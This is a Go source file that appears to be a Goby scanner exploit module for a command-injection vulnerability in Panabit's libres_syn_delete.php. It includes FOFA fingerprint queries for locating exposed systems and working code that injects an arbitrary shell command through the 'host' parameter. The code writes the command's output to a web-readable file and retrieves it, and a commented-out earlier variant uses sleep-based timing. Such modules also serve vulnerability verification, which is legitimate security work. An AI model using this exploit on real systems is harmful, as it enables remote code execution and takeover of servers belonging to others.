package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

//"body=\"padding:7px 0;width:228px;background:#EDF2F5;\""
//"body=\"unamexx\""

func init() {
	expJson := `{
    "Name": "Panabit libres_syn_delete.php file Command Execution vulnerability",
    "Description": "<p>Panabit is a server software system integrating traffic collection, application analysis, and bandwidth management.</p><p>There is a command execution vulnerability in the Panabit traffic analysis management system. The vulnerability is located in /content-apply/libres_syn_delete.php, submit three variables so that the token variable is not empty, the id is not empty, greater than and not equal to 0, judge through if, and then control the variable host, splicing it into cmd and substituting it into the exec function Execution, the attacker can use this vulnerability to execute code arbitrarily on the server side and obtain server privileges.</p>",
    "Product": "Panabit",
    "Homepage": "http://www.panabit.com/",
    "DisclosureDate": "2023-2-6",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"unamexx\"||body=\"padding:7px 0;width:228px;background:#EDF2F5;\"",
    "GobyQuery": "body=\"unamexx\"||body=\"padding:7px 0;width:228px;background:#EDF2F5;\"",
    "Level": "3",
    "Impact": "<p>Panabit is a server software system integrating traffic collection, application analysis, and bandwidth management.</p><p>There is a command execution vulnerability in the Panabit traffic analysis management system. The vulnerability is located in /content-apply/libres_syn_delete.php, submit three variables so that the token variable is not empty, the id is not empty, greater than and not equal to 0, judge through if, and then control the variable host, splicing it into cmd and substituting it into the exec function Execution, the attacker can use this vulnerability to execute code arbitrarily on the server side and obtain server privileges.</p>",
    "Recommendation": "<p>1. The official government has not fixed the vulnerability. Users are advised to contact the manufacturer to repair the vulnerability or follow the manufacturer's homepage at any time for a solution: <a href=\"https://www.panabit.com/\">https://www.panabit.com/</a></p><p>2. Set whitelist access.</p><p>3. Disable public networks from accessing the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.1",
    "Translation": {
        "CN": {
            "Name": "Panabit流量分析管理系统libres_syn_delete.php文件命令执行漏洞",
            "Product": "Panabit",
            "Description": "<p>Panabit是集流量采集、应用分析、带宽管理于一体的服务器软件系统。</p><p>Panabit流量分析管理系统存在命令执行漏洞。漏洞位于/content-apply/libres_syn_delete.php，提交三个变量让token变量不为空，id不为空、大于且不等于0，通过if判断，然后控制变量host，拼接到cmd中代入exec函数中执行，攻击者可通过该漏洞在服务器端任意执行代码，获取服务器权限。</p>",
            "Recommendation": "<p>1、官方未修复该漏洞，建议用户联系厂商修复漏洞或随时关注厂商主页以获取解决办法：<a href=\"https://www.panabit.com/\">https://www.panabit.com/</a></p><p>2、设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Panabit是集流量采集、应用分析、带宽管理于一体的服务器软件系统。</p><p>Panabit流量分析管理系统存在命令执行漏洞。漏洞位于/content-apply/libres_syn_delete.php，提交三个变量让token变量不为空，id不为空、大于且不等于0，通过if判断，然后控制变量host，拼接到cmd中代入exec函数中执行，攻击者可通过该漏洞在服务器端任意执行代码，获取服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Panabit libres_syn_delete.php file Command Execution vulnerability",
            "Product": "Panabit",
            "Description": "<p>Panabit is a server software system integrating traffic collection, application analysis, and bandwidth management.</p><p>There is a command execution vulnerability in the Panabit traffic analysis management system. The vulnerability is located in /content-apply/libres_syn_delete.php, submit three variables so that the token variable is not empty, the id is not empty, greater than and not equal to 0, judge through if, and then control the variable host, splicing it into cmd and substituting it into the exec function Execution, the attacker can use this vulnerability to execute code arbitrarily on the server side and obtain server privileges.</p>",
            "Recommendation": "<p>1. The official government has not fixed the vulnerability. Users are advised to contact the manufacturer to repair the vulnerability or follow the manufacturer's homepage at any time for a solution: <a href=\"https://www.panabit.com/\">https://www.panabit.com/</a></p><p>2. Set whitelist access.</p><p>3. Disable public networks from accessing the system if necessary.</p>",
            "Impact": "<p>Panabit is a server software system integrating traffic collection, application analysis, and bandwidth management.</p><p>There is a command execution vulnerability in the Panabit traffic analysis management system. The vulnerability is located in /content-apply/libres_syn_delete.php, submit three variables so that the token variable is not empty, the id is not empty, greater than and not equal to 0, judge through if, and then control the variable host, splicing it into cmd and substituting it into the exec function Execution, the attacker can use this vulnerability to execute code arbitrarily on the server side and obtain server privileges.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`
	//	ExpManager.AddExploit(NewExploit(
	//		goutils.GetFileName(),
	//		expJson,
	//		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
	//			//checkStr := goutils.RandomHexString(4)
	//			//checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
	//			//cmd := "curl " + checkUrl
	//			//if isDomain {
	//			//	cmd = "ping -c 1 " + checkUrl
	//			//}
	//			cmd:="sleep 0"
	//			var cmdtime time.Duration
	//			cmdTime0 := time.Now()
	//			if cmdTime1,result:=exploit_1097(u,cmd);result{
	//				cmdtime = cmdTime1.Sub(cmdTime0)
	//
	//			}
	//
	//
	//			cmd1:="sleep 5"
	//			var cmd1time time.Duration
	//			cmd1Time0 := time.Now()
	//			if cmd1Time1,result:=exploit_1097(u,cmd1);result{
	//				cmd1time = cmd1Time1.Sub(cmd1Time0)
	//			}
	//
	//
	//			cmd2:="sleep 10"
	//			var cmd2time time.Duration
	//			cmd2Time0 := time.Now()
	//			if cmd2Time1,result:=exploit_1097(u,cmd2);result{
	//				cmd2time = cmd2Time1.Sub(cmd2Time0)
	//			}
	//
	//			if cmd1time.Seconds() < cmdtime.Seconds()+7 && cmd2time.Seconds() > cmdtime.Seconds()+7 {
	//				return true
	//			}
	//			return false
	//
	//		},
	//		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
	//			cmd := ss.Params["cmd"].(string)
	//			exploit_1097(expResult.HostInfo, cmd)
	//			expResult.Output = "攻击已执行"
	//			expResult.Success = true
	//			return expResult
	//		},
	//	))
	//}
	//
	//func exploit_1097(u *httpclient.FixUrl,cmd string)(time.Time,bool){
	//	cfg := httpclient.NewGetRequestConfig("/content-apply/libres_syn_delete.php?token=1&id=1&host=1>/dev/null;echo%20`"+cmd+"`")
	//	cfg.VerifyTls = false
	//	cfg.FollowRedirect = true
	//
	//	if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
	//		Time1 := time.Now()
	//		return Time1,true
	//	}
	//	return time.Now(),false
	//}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			var exploit_1097 = func(u *httpclient.FixUrl, cmd string, checkStr string) (string, bool) {

				cfg := httpclient.NewGetRequestConfig("/content-apply/libres_syn_delete.php?token=1&id=1&host=1>/dev/null;echo%20`" + cmd + "`>" + checkStr + ".txt")
				cfg.VerifyTls = false
				cfg.FollowRedirect = true

				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
					if strings.Contains(resp.Utf8Html, "\"yn\":\"yes\"") {
						cfg := httpclient.NewGetRequestConfig("/content-apply/" + checkStr + ".txt")
						cfg.VerifyTls = false
						cfg.FollowRedirect = true
						if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
							return resp.Utf8Html, strings.Contains(resp.Utf8Html, "uid=")
						}
					}
				}
				return "", false
			}

			checkStr := goutils.RandomHexString(4)
			cmd := "id"
			if _, result := exploit_1097(u, cmd, checkStr); result {
				return true
			}
			return false

		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var exploit_1097 = func(u *httpclient.FixUrl, cmd string, checkStr string) (string, bool) {

				cfg := httpclient.NewGetRequestConfig("/content-apply/libres_syn_delete.php?token=1&id=1&host=1>/dev/null;echo%20`" + cmd + "`>" + checkStr + ".txt")
				cfg.VerifyTls = false
				cfg.FollowRedirect = true

				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
					if strings.Contains(resp.Utf8Html, "\"yn\":\"yes\"") {
						cfg := httpclient.NewGetRequestConfig("/content-apply/" + checkStr + ".txt")
						cfg.VerifyTls = false
						cfg.FollowRedirect = true
						if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
							return resp.Utf8Html, strings.Contains(resp.Utf8Html, "uid=")
						}
					}
				}
				return "", false
			}

			cmd := ss.Params["cmd"].(string)
			checkStr := goutils.RandomHexString(4)
			if Utf8Html, result := exploit_1097(expResult.HostInfo, cmd, checkStr); result {
				expResult.Output = Utf8Html
				expResult.Success = true
			}
			return expResult
		},
	))
}
